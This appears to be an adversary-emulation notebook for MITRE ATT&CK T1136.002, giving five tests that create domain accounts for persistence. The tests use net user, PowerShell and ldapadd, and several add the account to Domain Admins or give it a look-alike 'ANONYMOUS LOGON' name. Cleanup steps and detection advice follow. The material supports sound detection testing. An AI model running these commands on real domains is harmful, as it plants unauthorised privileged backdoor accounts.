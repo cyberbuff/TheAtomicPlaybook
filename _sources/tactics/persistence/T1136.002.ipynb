{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8e397b84",
   "metadata": {},
   "source": "# T1136.002 - Domain Account\nAdversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
  },
  {
   "cell_type": "markdown",
   "id": "89a8c265",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "d62f4b94",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Create a new Windows domain admin user",
    "Creates a new domain admin user in a command prompt.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user \"T1136.002_Admin\" \"T1136_pass123!\" /add /domain\nnet group \"Domain Admins\" \"T1136.002_Admin\" /add /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "977ca9c6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "ff792b92",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet user \"T1136.002_Admin\" >nul 2>&1 /del /domain\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eba40252",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0d4b072e",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Create a new account similar to ANONYMOUS LOGON",
    "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user \"ANONYMOUS  LOGON\" \"T1136_pass123!\" /add /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd91a732",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ff445834",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet user \"ANONYMOUS  LOGON\" >nul 2>&1 /del /domain\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83e58792",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bacceef3",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Create a new Domain Account using PowerShell",
    "Creates a new Domain User using the credentials of the Current User\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$SamAccountName = 'T1136.002_Admin'\n$AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\n$User.SamAccountName = $SamAccountName\n$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\n$User.Enabled = $True\n$User.PasswordNotRequired = $False\n$User.DisplayName = $SamAccountName\n$User.Save()\n$User\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0b8a44a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "6c4849f6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ncmd /c \"net user T1136.002_Admin /del >nul 2>&1\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "49a41015",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "566695f9",
   "metadata": {},
   "source": "### Atomic Test #4 - Active Directory Create Admin Account\nUse Admin Credentials to Create A Domain Admin Account\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Packages sssd-ad sssd-tools realmd adcli installed and realm available\n\n##### Check Prereq Commands:\n```sh\nwhich ldapadd && which ldapmodify\n\n```\n##### Get Prereq Commands:\n```sh\necho ldapadd or ldapmodify not found; exit 1\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4107412",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a6a47aae",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho \"dn: CN=Admin User,CN=Users,DC=example,DC=test\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@example.test\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test\" > tempadmin.ldif\necho ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif\nldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "69e7d25f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "4a84001d",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\necho removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://adVM:389 -x -D admin@example.test -w s3CurePssw0rD! -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42f15264",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8612d340",
   "metadata": {},
   "source": "### Atomic Test #5 - Active Directory Create User Account (Non-elevated)\nUse Admin Credentials to Create A Normal Account (as means of entry)\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapadd, ldapmodify\n\n##### Check Prereq Commands:\n```sh\nwhich ldapadd\nwhich ldapmodify\n\n```\n##### Get Prereq Commands:\n```sh\necho ldapadd or ldapmodify not found; exit 1\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d1729a56",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1fcd6331",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho \"dn: cn=Atomic User, cn=Users,dc=example,dc=test\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif\necho ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif\nldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e06f8a76",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "40da1d25",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\necho removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://adVM:389 -x -D user@example.test -w s3CurePssw0rD! -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1729e67c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.002 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1d66bcf7",
   "metadata": {},
   "source": "## Detection\nMonitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}